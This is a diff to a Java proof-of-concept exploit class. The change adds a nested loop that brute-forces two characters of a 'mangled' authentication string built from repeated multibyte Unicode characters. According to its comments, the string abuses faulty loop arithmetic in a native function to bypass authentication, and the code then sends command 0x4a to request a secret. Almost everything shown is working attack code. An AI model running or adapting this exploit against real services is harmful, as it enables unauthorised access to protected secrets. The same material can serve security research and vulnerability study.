@@ -105,13 +105,21 @@ public class POC {
         try{ Thread.sleep(1) ; } catch (Exception e){}
         // we made the string have one char for username, one char is the ":" character, and the random password is 
         // 64 characters, so we need 
-        
+        // there is some bath math in the lopp of the native function, so two characters of the auth string DONT get overwriten.
+        // just guess those 
         // byte[] t = "⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪".getBytes();
-        byte[] t = "⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪".getBytes();
-        byte[] command_type = {0x4a};
-        byte[] command = joinByteArray(command_type, t); 
-        System.out.println("Requesting secret with mangled auth string...");
-        sendCommand(command);
+        String t = "⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪";
+        // String crib = "ASDFGHJKLQWERTYUIOPZXCVBNM[\\]^_`asdfghjklzxcvbnmqwertyuiop";
+        for(int i = 65; i<=122;i++){
+            for(int j = 65; j<=122;j++){
+                String authstr = t.concat(String.valueOf((char)i)).concat(String.valueOf((char)j));
+                byte[] command_type = {0x4a};
+                byte[] command = joinByteArray(command_type, authstr.getBytes());
+                System.out.println("Requesting secret with mangled auth string...");
+                sendCommand(command);
+            }
+        }
+        
 
 
     }
